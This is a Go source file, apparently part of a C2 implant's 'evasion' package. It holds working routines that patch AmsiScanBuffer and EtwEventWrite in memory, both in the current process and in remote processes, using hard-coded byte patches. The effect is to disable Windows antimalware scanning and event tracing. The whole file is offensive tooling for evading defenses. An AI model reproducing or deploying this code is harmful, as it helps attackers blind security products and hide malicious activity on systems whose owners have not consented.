//go:build windows

package evasion

import (
	"fmt"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// PatchAMSI patches AmsiScanBuffer in the current process to always return AMSI_RESULT_CLEAN.
func PatchAMSI() error {
	amsi := windows.NewLazySystemDLL("amsi.dll")
	if err := amsi.Load(); err != nil {
		return fmt.Errorf("amsi.dll not loaded (AMSI may be disabled): %w", err)
	}
	fn := amsi.NewProc("AmsiScanBuffer")
	if err := fn.Find(); err != nil {
		return fmt.Errorf("AmsiScanBuffer not found: %w", err)
	}
	return winsyscall.PatchBytes(fn.Addr(), []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3})
}

// PatchAMSIRemote patches AmsiScanBuffer inside a remote process.
func PatchAMSIRemote(pid uint32) error {
	hProc, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	amsi := windows.NewLazySystemDLL("amsi.dll")
	if err := amsi.Load(); err != nil {
		return fmt.Errorf("amsi.dll not available locally: %w", err)
	}
	fn := amsi.NewProc("AmsiScanBuffer")
	if err := fn.Find(); err != nil {
		return fmt.Errorf("AmsiScanBuffer not found: %w", err)
	}
	return winsyscall.PatchBytesRemote(hProc, fn.Addr(), []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3})
}

// PatchETW patches EtwEventWrite in ntdll.dll to immediately return.
func PatchETW() error {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	fn := ntdll.NewProc("EtwEventWrite")
	if err := fn.Find(); err != nil {
		return fmt.Errorf("EtwEventWrite not found: %w", err)
	}
	return winsyscall.PatchBytes(fn.Addr(), []byte{0xC3})
}

// PatchETWRemote patches EtwEventWrite inside a remote process.
func PatchETWRemote(pid uint32) error {
	hProc, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	fn := ntdll.NewProc("EtwEventWrite")
	if err := fn.Find(); err != nil {
		return fmt.Errorf("EtwEventWrite not found: %w", err)
	}
	return winsyscall.PatchBytesRemote(hProc, fn.Addr(), []byte{0xC3})
}
